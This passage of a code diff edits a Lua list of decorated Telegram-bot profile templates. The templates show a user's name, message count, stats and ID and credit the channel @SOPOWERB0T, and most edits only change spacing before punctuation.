+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -13826,10 +13833,10 @@ local List = {
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -13865,11 +13872,11 @@ local List = {
 ► 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -13884,15 +13891,15 @@ local List = {
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -13911,10 +13918,10 @@ local List = {
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -13970,26 +13977,26 @@ local List = {
 ➞: 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅.
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -14023,10 +14030,10 @@ local List = {
 🦅 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -14051,7 +14058,7 @@ local List = {
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -14076,13 +14083,13 @@ local List = {
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -14161,19 +14168,19 @@ local List = {
 ‌‎⿻┊‌‎𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -14184,10 +14191,10 @@ local List = {
 •𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -14212,18 +14219,18 @@ local List = {
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -14242,27 +14249,27 @@ Msᴀɢ ~ #msgs
 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -14287,19 +14294,19 @@ Msᴀɢ ~ #msgs
 𓂅 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -14318,18 +14325,18 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -14341,12 +14348,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -14410,10 +14417,10 @@ Msᴀɢ ~ #msgs
 ⌯  𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14425,10 +14432,10 @@ Msᴀɢ ~ #msgs
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14448,11 +14455,11 @@ Msᴀɢ ~ #msgs
 𖤂 ~ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -14483,15 +14490,15 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14510,10 +14517,10 @@ Msᴀɢ ~ #msgs
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14569,26 +14576,26 @@ Msᴀɢ ~ #msgs
 ➞: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14629,10 +14636,10 @@ Msᴀɢ ~ #msgs
 ◣: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14650,7 +14657,7 @@ Msᴀɢ ~ #msgs
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -14675,13 +14682,13 @@ Msᴀɢ ~ #msgs
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14759,19 +14766,19 @@ Msᴀɢ ~ #msgs
 ✰ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14782,10 +14789,10 @@ Msᴀɢ ~ #msgs
 •𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -14810,18 +14817,18 @@ Msᴀɢ ~ #msgs
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
